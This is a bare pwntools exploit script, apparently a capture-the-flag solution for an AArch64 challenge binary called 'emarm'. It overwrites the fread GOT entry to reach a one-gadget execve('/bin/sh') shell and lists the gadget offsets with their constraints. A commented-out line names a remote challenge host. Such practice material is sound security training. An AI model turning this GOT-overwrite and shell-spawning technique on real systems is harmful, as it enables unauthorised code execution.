from pwn import *

context.log_level = "debug"
context.arch = "aarch64"

def write1(addr,value):
    target = str(addr)
    target = target.ljust(8,"\x00")
    p.send(str(target))
#    p.interactive()
    p.recvuntil("you will success")
    p.send(value)
    
#p = remote("183.129.189.60",10012)
#p =process("./emarm")
p  = process(["qemu-aarch64-static","./emarm"])
#p  = process(["qemu-aarch64","-g","1234","./emarm"])
elf = ELF("./emarm")
libc = elf.libc

p.recvline()
print(p.recvuntil("passwd:\n"))
p.send(p64(0)) #passwd
#p.interactive()
write1(elf.got["fread"],p16(0x3e80))
#write(0x412080,"xx")
p.recvuntil("i leave for you bye")
p.sendline("0")

p.interactive()


'''
atoi 0x33710

0x3f150 execve("/bin/sh", sp+0x70, environ)
constraints:
  address x20+0x338 is writable
  x3 == NULL

0x3f174 execve("/bin/sh", sp+0x70, environ)
constraints:
  addresses x19+0x4, x20+0x338 are writable
  [sp+0x70] == NULL

0x3f198 execve("/bin/sh", x21, environ)
constraints:
  addresses x19+0x4, x20+0x338 are writable
  [x21] == NULL || x21 == NULL

fread 0x628e0
0x63e80 execl("/bin/sh", x1)
constraints:
x1 == NULL


'''
